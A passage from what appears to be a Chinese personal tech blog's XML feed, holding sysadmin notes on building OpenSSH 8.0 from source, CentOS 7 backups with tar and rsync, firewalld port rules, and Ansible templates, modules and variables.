class="line">./configure --prefix=/usr                     \</span><br><span class="line">            --sysconfdir=/etc/ssh             \</span><br><span class="line">            --with-md5-passwords              \</span><br><span class="line">            --with-pam  \</span><br><span class="line">            --with-privsep-path=/var/lib/sshd</span><br></pre></td></tr></table></figure><h3 id="编译并测试下"><a href="#编译并测试下" class="headerlink" title="编译并测试下"></a>编译并测试下</h3><p>make &amp;&amp; make test</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">make install &amp;&amp;</span><br><span class="line">install -v -m755    contrib/ssh-copy-id /usr/bin     &amp;&amp;</span><br><span class="line"></span><br><span class="line">install -v -m644    contrib/ssh-copy-id.1 \</span><br><span class="line">                    /usr/share/man/man1              &amp;&amp;</span><br><span class="line">install -v -m755 -d /usr/share/doc/openssh-8.0p1     &amp;&amp;</span><br><span class="line">install -v -m644    INSTALL LICENCE OVERVIEW README* \</span><br><span class="line">                    /usr/share/doc/openssh-8.0p1</span><br></pre></td></tr></table></figure><h4 id="遇到的两个错误信息"><a href="#遇到的两个错误信息" class="headerlink" title="遇到的两个错误信息"></a>遇到的两个错误信息</h4><h4 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h4><pre><code>/etc/ssh/sshd_config line 79: Unsupported option GSSAPIAuthentication/etc/ssh/sshd_config line 80: Unsupported option GSSAPICleanupCredentials</code></pre><p>注释掉这两行就好啦, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^GSSAPICleanupCredentials/s/GSSAPICleanupCredentials yes/#GSSAPICleanupCredentials yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication yes/#GSSAPIAuthentication yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication no/#GSSAPIAuthentication no/&#x27;</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><h4 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h4><pre><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_rsa_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_rsa_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_rsa_key@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_ecdsa_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_ecdsa_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_ecdsa_key@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_ed25519_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_ed25519_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_ed25519_keysshd: no hostkeys available -- exiting.make: [check-config] Error 1 (ignored)</code></pre><p>上面三个文件的权限问题, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/ssh/ssh_host_rsa_key &amp;&amp;</span><br><span class="line">chmod 600 /etc/ssh/ssh_host_ecdsa_key &amp;&amp;</span><br><span class="line">chmod 600 /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure><h4 id="修改配置文件-允许root登录"><a href="#修改配置文件-允许root登录" class="headerlink" title="修改配置文件,允许root登录"></a>修改配置文件,允许root登录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^#PermitRootLogin/s/#PermitRootLogin no/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line">sed -i <span class="string">&#x27;/^#PermitRootLogin/s/#PermitRootLogin yes/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><h3 id="sshd-开机启动"><a href="#sshd-开机启动" class="headerlink" title="sshd 开机启动"></a>sshd 开机启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd</span><br></pre></td></tr></table></figure><p>还有别忘了关闭 telnet 喔!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop xinetd &amp;&amp;</span><br><span class="line">systemctl stop telnet.socket &amp;&amp;</span><br></pre></td></tr></table></figure><p>———————————————————— END ————————————————————</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7_backup</title>
      <link href="//p/2019/CentOS7-backup/"/>
      <url>//p/2019/CentOS7-backup/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.51cto.com/13272050/2094687">参考链接: 左客 rsync增量备份</a></p><h3 id="tar-备份失败"><a href="#tar-备份失败" class="headerlink" title="tar 备份失败"></a>tar 备份失败</h3><p>一个小坑:<br>我在执行下面命令的时候, 如果我不是在根目录, 会导致备份失败, 不是很懂为什么.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time tar cvpjf <span class="variable">$&#123;BZ2BACKUP&#125;</span> --exclude=/proc --exclude=/lost+found --exclude=/<span class="variable">$&#123;BZ2BACKUP&#125;</span> --exclude=/mnt --exclude=/sys --exclude=/media /</span><br></pre></td></tr></table></figure><h3 id="rsync-三种工作方式"><a href="#rsync-三种工作方式" class="headerlink" title="rsync 三种工作方式"></a>rsync 三种工作方式</h3><ul><li><p>本地文件系统上实现同步。命令行语法格式为上述”Local”段的格式。</p></li><li><p>本地主机使用远程shell和远程主机通信。命令行语法格式为上述”Access via remote shell”段的格式。</p></li><li><p>本地主机通过网络套接字连接远程主机上的rsync daemon。命令行语法格式为上述”Access via rsync daemon”段的格式。</p></li></ul><pre style = "margin: 0 -120px; font-size: 14px; width: 970px; line-height: 26px;">    <font color = #00B000>相关参数说明:-v：显示rsync过程中详细信息。可以使用"-vvvv"获取更详细信息。-P：显示文件传输的进度信息。(实际上"-P"="--partial --progress"，其中的"--progress"才是显示进度信息的)。-n --dry-run  ：仅测试传输，而不实际传输。常和"-vvvv"配合使用来查看rsync是如何工作的。-a --archive  ：归档模式，表示递归传输并保持文件属性。等同于"-rtopgDl"。-r --recursive：递归到目录中去。-t --times：保持mtime属性。强烈建议任何时候都加上"-t"，否则目标文件mtime会设置为系统时间，导致下次更新          ：检查出mtime不同从而导致增量传输无效。-o --owner：保持owner属性(属主)。-g --group：保持group属性(属组)。-p --perms：保持perms属性(权限，不包括特殊权限)。-D        ：是"--device --specials"选项的组合，即也拷贝设备文件和特殊文件。-l --links：如果文件是软链接文件，则拷贝软链接本身而非软链接所指向的对象。-z        ：传输时进行压缩提高效率。-R --relative：使用相对路径。意味着将命令行中指定的全路径而非路径最尾部的文件名发送给服务端，包括它们的属性。用法见下文示例。--size-only ：默认算法是检查文件大小和mtime不同的文件，使用此选项将只检查文件大小。-u --update ：仅在源mtime比目标已存在文件的mtime新时才拷贝。注意，该选项是接收端判断的，不会影响删除行为。-d --dirs   ：以不递归的方式拷贝目录本身。默认递归时，如果源为"dir1/file1"，则不会拷贝dir1目录，使用该选项将拷贝dir1但不拷贝file1。--max-size  ：限制rsync传输的最大文件大小。可以使用单位后缀，还可以是一个小数值(例如："--max-size=1.5m")--min-size  ：限制rsync传输的最小文件大小。这可以用于禁止传输小文件或那些垃圾文件。--exclude   ：指定排除规则来排除不需要传输的文件。--delete    ：以SRC为主，对DEST进行同步。多则删之，少则补之。注意"--delete"是在接收端执行的，所以它是在            ：exclude/include规则生效之后才执行的。-b --backup ：对目标上已存在的文件做一个备份，备份的文件名后默认使用"~"做后缀。--backup-dir：指定备份文件的保存路径。不指定时默认和待备份文件保存在同一目录下。-e          ：指定所要使用的远程shell程序，默认为ssh。--port      ：连接daemon时使用的端口号，默认为873端口。--password-file：daemon模式时的密码文件，可以从中读取密码实现非交互式。注意，这不是远程shell认证的密码，而是rsync模块认证的密码。-W --whole-file：rsync将不再使用增量传输，而是全量传输。在网络带宽高于磁盘带宽时，该选项比增量传输更高效。--existing  ：要求只更新目标端已存在的文件，目标端还不存在的文件不传输。注意，使用相对路径时如果上层目录不存在也不会传输。--ignore-existing：要求只更新目标端不存在的文件。和"--existing"结合使用有特殊功能，见下文示例。--remove-source-files：要求删除源端已经成功传输的文件。    </font></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> 备份 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7</title>
      <link href="//p/2019/CentOS7/"/>
      <url>//p/2019/CentOS7/</url>
      
        <content type="html"><![CDATA[<h4 id="我使用滴-CentOS-7-版本-CentOS-Linux-release-7-2-1511-Core"><a href="#我使用滴-CentOS-7-版本-CentOS-Linux-release-7-2-1511-Core" class="headerlink" title="我使用滴 CentOS 7 版本: CentOS Linux release 7.2.1511 (Core)"></a>我使用滴 CentOS 7 版本: CentOS Linux release 7.2.1511 (Core)</h4><h3 id="CentOS-6-和-CentOS-7-在华为平台上的两个主要区别"><a href="#CentOS-6-和-CentOS-7-在华为平台上的两个主要区别" class="headerlink" title="CentOS 6 和 CentOS 7 在华为平台上的两个主要区别"></a>CentOS 6 和 CentOS 7 在华为平台上的两个主要区别</h3><ul><li><p>CentOS6：</p><ul><li>支持快照；</li><li>采用sysvinit，服务启动稍慢，fstab和nfs挂载容易出现问题。</li></ul></li><li><p>CentOS7：</p><ul><li>不支持快照，需要自己备份；</li><li>采用systemed，设计目标是克服sysvinit的缺点。</li></ul></li></ul><h3 id="firewalld-amp-amp-firewall-cmd"><a href="#firewalld-amp-amp-firewall-cmd" class="headerlink" title="firewalld &amp;&amp; firewall-cmd"></a>firewalld &amp;&amp; firewall-cmd</h3><p>新安装好 nginx 的我兴致勃勃的输入我的ip, 结果….<br><img src="/img/Linux_Server_Maintenance/firewall_nginx_err.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/firewall_nginx_err.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="firewall_nginx_err"></p><p>于是我检查 服务状态, 配置文件 和 日志文件 好像在 Ubuntu 上都是一样呀..<br>然后发现了 CentOS7 的防火墙默认只开启 ssh 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-services</span><br></pre></td></tr></table></figure><p>那怎么去开启一个端口呢? 这里用 80 端口举例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent  <span class="comment"># （--permanent永久生效，没有此参数重启后失效）</span></span><br><span class="line">firewall-cmd --reload <span class="comment"># 重新载入</span></span><br><span class="line">firewall-cmd --zone=public --query-port=80/tcp <span class="comment"># 查看 80 端口</span></span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp --permanent <span class="comment"># 关闭 80 端口</span></span><br></pre></td></tr></table></figure><p>然后就可以正常访问 nginx 啦!</p><p>于是又想起许多防火墙是通过 iptables 去管理的, 顺便到 Red Hat 官方文档 gup 了一下</p><p>发现在 RHEL7 系统中, 系统默认是自带 firewall 的, 并且默认关闭开启80端口</p><p>值得一提的是 firewall 调用 iptables 的相关命令.</p><p>想要详细了解可以参考 <a href="https://blog.csdn.net/liitdar/article/details/80889177">liitdar的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 ansible (三)</title>
      <link href="//p/2019/%E5%88%9D%E8%AF%86-ansible-3/"/>
      <url>//p/2019/%E5%88%9D%E8%AF%86-ansible-3/</url>
      
        <content type="html"><![CDATA[<h3 id="模板-templates"><a href="#模板-templates" class="headerlink" title="模板 templates"></a>模板 templates</h3><p>Jinja2语言</p><p>算数运算: //(取整)</p><p>建议放在ansible目录下, 创建一个 templates 文件夹</p><p>模板文件后缀 .j2</p><p>配置文件变量用  {{ }}   括起来</p><h3 id="with-items-迭代"><a href="#with-items-迭代" class="headerlink" title="with_items 迭代"></a>with_items 迭代</h3><p>对迭代项的引用， 固定变量名为 “item”<br>要在 task 中使用 with_items 给定要迭代的元素列表<br>列表格式: 字符串 或 字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- hosts: all</span><br><span class="line">  remote_user: root</span><br><span class="line">  vars_files:</span><br><span class="line">    - vars.yml</span><br><span class="line"></span><br><span class="line">  tasks:</span><br><span class="line">    - name: unarchive</span><br><span class="line">      unarchive: src=&#123;&#123; ansibleShellRoot &#125;&#125;&#123;&#123; item &#125;&#125; dest=/tmp/ copy=yes</span><br><span class="line">      with_items:</span><br><span class="line">        - test1.tar.gz</span><br><span class="line">        - test2.tar.gz</span><br><span class="line">        - test3.tar.gz</span><br></pre></td></tr></table></figure><h3 id="playbook-gt-template-中的-for-和-if"><a href="#playbook-gt-template-中的-for-和-if" class="headerlink" title="playbook -&gt; template 中的 for 和 if"></a>playbook -&gt; template 中的 for 和 if</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># for</span><br><span class="line">&#123;% for vhost in nginx_vhosts %&#125;</span><br><span class="line">&#123;% endraw %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; vhost.listen | default(&#x27;80 default_server&#x27; ) &#125;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># if</span><br><span class="line">&#123;% if vhost.server_name is defined %&#125;</span><br><span class="line">server_name &#123;</span><br><span class="line">&#123;&#123; vhost.server_name &#125;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"># if</span><br><span class="line">&#123;% if vhost.server_name is defined %&#125;</span><br><span class="line">root &#123;&#123; vhost.root &#125;&#125;;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="for-循环举例"><a href="#for-循环举例" class="headerlink" title="for 循环举例"></a>for 循环举例</h4><p>.conf.j2 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for p in ports %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; p.port &#125;&#125;;</span><br><span class="line">servername &#123;&#123; p.name &#125;&#125;;</span><br><span class="line">root &#123;&#123; p.rootdir &#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>.yml 文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web1:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web1.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web2:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">82</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web2.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web3:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web3.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web3</span></span><br><span class="line">        </span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">conf</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=/path/**.conf.j2</span> <span class="string">dest=/path/**.conf</span></span><br></pre></td></tr></table></figure><h4 id="if-判断举例"><a href="#if-判断举例" class="headerlink" title="if 判断举例"></a>if 判断举例</h4><p>.conf.j2 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for p in ports %&#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen &#123;&#123; p.port &#125;&#125;;</span><br><span class="line"></span><br><span class="line">&#123;% if p.name is defined %&#125;</span><br><span class="line">servername &#123;&#123; p.name &#125;&#125;;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">root &#123;&#123; p.rootdir &#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>.yml 文件</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web1:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web2:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">82</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">web2.site.com</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">web3:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">83</span></span><br><span class="line">        <span class="attr">rootdir:</span> <span class="string">/data/web3</span></span><br><span class="line">        </span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copy</span> <span class="string">conf</span></span><br><span class="line">      <span class="attr">template:</span> <span class="string">src=/path/**.conf.j2</span> <span class="string">dest=/path/**.conf</span></span><br></pre></td></tr></table></figure><h3 id="roles-角色"><a href="#roles-角色" class="headerlink" title="roles 角色"></a>roles 角色</h3><p>roles 使得 playbook 模块化，并且在模块中的 - include roles/path 中的roles为 /etc/ansible/ 路径下的 roles. </p><p>roles 的目录树结构如下图所示 (其中的main.yml 类似于入口函数, 负责按照一定顺序调用各个模块):<br><img src="/img/ansible/tree_ansible_roles.png" class="lazyload" data-srcset="/img/ansible/tree_ansible_roles.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="tree_ansible_roles"></p><p>如果上图中的 nginx 角色要调用不同角色的文件, 需要 - include roles/角色/tasks/某某.yml</p><h4 id="角色标签"><a href="#角色标签" class="headerlink" title="角色标签"></a>角色标签</h4><p>roles:</p><ul><li>{ role: nginx, tages:[‘web’, ‘nginx’]}</li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识 ansible (二)</title>
      <link href="//p/2019/%E5%88%9D%E8%AF%86-ansible-2/"/>
      <url>//p/2019/%E5%88%9D%E8%AF%86-ansible-2/</url>
      
        <content type="html"><![CDATA[<h3 id="ansible-常用模块"><a href="#ansible-常用模块" class="headerlink" title="ansible 常用模块"></a>ansible 常用模块</h3><ul><li><p>Command: 在远程主机执行命令, 默认模块, 可忽略 -m 选项<br>ansible all (-m command) -a ‘service nginx restart’<br>此命令不支持 $VARNAME &lt; &gt; | ; &amp; *等, 用 shell 模块实现</p></li><li><p>Shell: </p><ul><li>-a 参数尽量放到单引号中!<br>ansible all -m shell -a ‘echo pass | passwd -stdin user’<br>调用bash执行命令 蕾西 cat /tmp/stanley.md | awk -F ‘|’ ‘print $1,$2’ &amp;&gt; /tmp/example.txt<br>这些复杂命令, 即使使用 shell 也可能会失败, 解决办法: 写到脚本时, copy到远程, 执行. 再把需要的结果拉回执行命令的机器</li></ul></li><li><p>Script: 运行脚本</p></li></ul><p>-a “/PATH/TO/SCRIPT_FILE”<br>ansible all -m script -a shel.sh</p><h3 id="ansible-vault-加密解密"><a href="#ansible-vault-加密解密" class="headerlink" title="ansible-vault 加密解密"></a>ansible-vault 加密解密</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ansible-vault encrypt file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault decrypt file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault edit file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault view file.yml </span><br><span class="line"></span><br><span class="line">ansible-vault reykey file.yml</span><br></pre></td></tr></table></figure><h3 id="ansible-console-交互"><a href="#ansible-console-交互" class="headerlink" title="ansible-console 交互"></a>ansible-console 交互</h3><h3 id="YAML-语法"><a href="#YAML-语法" class="headerlink" title="YAML 语法"></a>YAML 语法</h3><p>在单一档案中, 可用连续三个连字号(—)区分多个档案. 另外, 还有选择性的连续三个点好(…)用来表示档案结尾<br>风格和python类似<br>一个完整代码功能需最少元素包含 name: task<br>                            module: arguments (arguments 一般是 key=value)<br>拓展名通常为 yml 或 yaml</p><p>模板:</p><pre><code>- hosts: websrvs  remote_user: root    tasks:       - name: test connection        ping:</code></pre><p>ansible目录下 vars.yml 专用于存放变量</p><h3 id="ansible-playbook"><a href="#ansible-playbook" class="headerlink" title="ansible-playbook"></a>ansible-playbook</h3><ul><li><p>运行 playbook 的方式<br>  ansible-playbook &lt;filename.yml&gt; … [options]</p><ul><li>-check 检查</li><li>–list-hosts 列出运行任务的主机</li><li>–limit 只针对主机列表中的主机执行</li><li>-v 显示过程 -vv -vvv 更详细</li></ul></li><li><p>一个模块只对应一个内容</p></li></ul><p>如下:</p><pre><code>task :  - name: copy file1    copy: src=file1 dest=/path/    copy: src=file2 dest=/path/</code></pre><p>这样只会 copy file2</p><p>顺便记下 backup 参数, backup=yes 会在复制前备份一个, 防止覆盖.<br>备份的文件名是: 文件名_随机数_时间</p><ul><li>ignore_errors</li></ul><p>即使途中出错也会继续运行: </p><pre><code>tasks:  - name: rum and ignore the result    shell: ...    ignore_errors: True</code></pre><ul><li><p>handlers 与 notify 触发事件</p><ul><li>handlers 用于当关注的资源发生变化时, 才会才会采取一定的操作</li><li>notify 调用 handler 中定义的操作</li><li>handlers 与 tasks 同级, 并且 notify 名字需要与 handlers 中的 name 名字相同</li></ul><p>  hosts: websrvs<br>  remote_user: root</p><pre><code>tasks:  - name: add group nginx    user: name=nginx state=present  - name: add user nginx    user: name=nginx state=present group=nginx   - name: install Nginx    yum: name=nginx state=present    notify:      - restart Nginx      - check Nginx processhandlers:  - name: restart Nginx    service: name=nginx state=restartd enabled=yes  - name: check Nginx process    shell: killall -0 nginx</code></pre></li><li><p>tags 标签</p></li></ul><p>可以单独只执行标签<br>多个动作可以公用一个标签</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook -t 标签 文件.yml</span><br></pre></td></tr></table></figure><ul><li><p>变量的使用</p><ul><li>ansible setup facts 远程主机的所有变量都可直接调用<br>  ansible all -m setup 查看所有系统自带变量</li><li>在 /etc/ansible/hosts 中定义<br>  普通变量: 主机组中主机单独定义, 优先级高于公共变量<br>  如: [websrvs]<pre><code>  192.168.22.33 http_port=81  192.168.22.34 http_port=82</code></pre>  公共(组)变量: 针对主机组中所有主机定义统一变量<br>  如: [websrvs:vars]<pre><code>  nodename=www  domainname=example.com</code></pre></li><li>通过命令行制定变量, 优先级最高<br>  如: ansible-playbook -e varname=value</li><li>在 playbook 中定义<br>  vars:<pre><code>\- var1:value1\- var12:value2</code></pre></li><li>在 role 中定义</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Motrix + aria2 踩坑</title>
      <link href="//p/2019/Motrix+aria2_%E8%B8%A9%E5%9D%91/"/>
      <url>//p/2019/Motrix+aria2_%E8%B8%A9%E5%9D%91/</url>
      
